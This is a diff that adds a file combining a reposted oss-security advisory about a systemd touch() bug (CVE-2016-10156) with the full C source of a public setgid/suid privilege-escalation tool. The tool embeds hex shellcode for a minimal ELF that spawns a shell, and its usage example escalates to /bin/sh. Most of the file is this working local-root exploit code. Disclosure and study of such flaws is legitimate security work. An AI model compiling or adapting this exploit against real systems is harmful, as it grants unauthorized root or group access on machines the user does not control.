@@ -1,0 +1,160 @@
+Source: http://www.openwall.com/lists/oss-security/2017/01/24/4
+
+This is a heads up for a trivial systemd local root exploit, that
+was silently fixed in the upstream git as:
+
+commit 06eeacb6fe029804f296b065b3ce91e796e1cd0e
+Author: ....
+Date:   Fri Jan 29 23:36:08 2016 +0200
+
+    basic: fix touch() creating files with 07777 mode
+    
+    mode_t is unsigned, so MODE_INVALID < 0 can never be true.
+    
+    This fixes a possible DoS where any user could fill /run by writing to
+    a world-writable /run/systemd/show-status.
+
+The analysis says that is a "possible DoS", but its a local root
+exploit indeed. Mode 07777 also contains the suid bit, so files
+created by touch() are world writable suids, root owned. Such
+as /var/lib/systemd/timers/stamp-fstrim.timer thats found on a non-nosuid mount.
+
+This is trivially exploited by something like:
+
+http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c
+
+with minimal changes, so I wont provide a PoC here.
+
+The bug was possibly introduced via:
+
+commit ee735086f8670be1591fa9593e80dd60163a7a2f
+Author: ...
+Date:   Wed Nov 11 22:54:56 2015 +0100
+
+    util-lib: use MODE_INVALID as invalid value for mode_t everywhere
+
+
+So we believe that this mostly affects v228 of systemd, but its recommended
+that distributors cross-check their systemd versions for vulnerable
+touch_*() functions. We requested
+a CVE for this issue from MITRE by ourselfs: CVE-2016-10156
+
+We would like to see that systemd upstream retrieves CVE's themself
+for their own bugs, even if its believed that its just a local DoS.
+This would make distributors life much easier when we read the git logs
+to spot potential issues. The systemd git log is really huge, with
+lots of commits each week ("new services as a service").
+
+Sebastian
+
+
+
+
+// Source: http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c
+
+/** This software is provided by the copyright owner "as is" and any
+ *  expressed or implied warranties, including, but not limited to,
+ *  the implied warranties of merchantability and fitness for a particular
+ *  purpose are disclaimed. In no event shall the copyright owner be
+ *  liable for any direct, indirect, incidential, special, exemplary or
+ *  consequential damages, including, but not limited to, procurement
+ *  of substitute goods or services, loss of use, data or profits or
+ *  business interruption, however caused and on any theory of liability,
+ *  whether in contract, strict liability, or tort, including negligence
+ *  or otherwise, arising in any way out of the use of this software,
+ *  even if advised of the possibility of such damage.
+ *
+ *  This tool allows to create a setgid binary in appropriate directory
+ *  to escalate to the group of this directory.
+ *
+ *  Compile: gcc -o CreateSetgidBinary CreateSetgidBinary.c
+ *
+ *  Usage: CreateSetgidBinary [targetfile] [suid-binary] [placeholder] [args]
+ *
+ *  Example: 
+ *
+ *  # ./CreateSetgidBinary ./escalate /bin/mount x nonexistent-arg
+ *  # ls -al ./escalate
+ *  # ./escalate /bin/sh
+ *
+ *  Copyright (c) 2015 halfdog <me (%) halfdog.net>
+ *
+ *  See http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/ for more information.
+ */
+
+#include <errno.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <sys/resource.h>
+#include <unistd.h>
+#include <sys/wait.h>
+
+int main(int argc, char **argv) {
+// No slashes allowed, everything else is OK.
+  char suidExecMinimalElf[] = {
+      0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
+      0x80, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0xf8, 0x00, 0x00, 0x00,
+      0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x02, 0x00, 0x28, 0x00,
+      0x05, 0x00, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xa2, 0x00, 0x00, 0x00,
+      0xa2, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
+      0x01, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00, 0x00, 0xa4, 0x90, 0x04, 0x08,
+      0xa4, 0x90, 0x04, 0x08, 0x09, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
+      0x06, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x89, 0xc8,
+      0x89, 0xd0, 0x89, 0xd8, 0x04, 0xd2, 0xcd, 0x80, 0x31, 0xc0, 0x89, 0xd0,
+      0xb0, 0x0b, 0x89, 0xe1, 0x83, 0xc1, 0x08, 0x8b, 0x19, 0xcd, 0x80
+  };
+
+  int destFd=open(argv[1], O_RDWR|O_CREAT, 07777);
+  if(destFd<0) {
+    fprintf(stderr, "Failed to open %s, error %s\n", argv[1], strerror(errno));
+    return(1);
+  }
+
+  char *suidWriteNext=suidExecMinimalElf;
+  char *suidWriteEnd=suidExecMinimalElf+sizeof(suidExecMinimalElf);
+  while(suidWriteNext!=suidWriteEnd) {
+    char *suidWriteTestPos=suidWriteNext;
+    while((!*suidWriteTestPos)&&(suidWriteTestPos!=suidWriteEnd))
+      suidWriteTestPos++;
+// We cannot write any 0-bytes. So let seek fill up the file wihh
+// null-bytes for us.
+    lseek(destFd, suidWriteTestPos-suidExecMinimalElf, SEEK_SET);
+    suidWriteNext=suidWriteTestPos;
+    while((*suidWriteTestPos)&&(suidWriteTestPos!=suidWriteEnd))
+      suidWriteTestPos++;
+
+    int result=fork();
+    if(!result) {
+      struct rlimit limits;
+
+// We can't truncate, that would remove the setgid property of
+// the file. So make sure the SUID binary does not write too much.
+      limits.rlim_cur=suidWriteTestPos-suidExecMinimalElf;
+      limits.rlim_max=limits.rlim_cur;
+      setrlimit(RLIMIT_FSIZE, &limits);
+
+// Do not rely on some SUID binary to print out the unmodified
+// program name, some OSes might have hardening against that.
+// Let the ld-loader will do that for us.
+      limits.rlim_cur=1<<22;
+      limits.rlim_max=limits.rlim_cur;
+      result=setrlimit(RLIMIT_AS, &limits);
+
+      dup2(destFd, 1);
+      dup2(destFd, 2);
+      argv[3]=suidWriteNext;
+      execve(argv[2], argv+3, NULL);
+      fprintf(stderr, "Exec failed\n");
+      return(1);
+    }
+    waitpid(result, NULL, 0);
+    suidWriteNext=suidWriteTestPos;
+//  ftruncate(destFd, suidWriteTestPos-suidExecMinimalElf);
+  }
+  fprintf(stderr, "Completed\n");
+  return(0);
+}
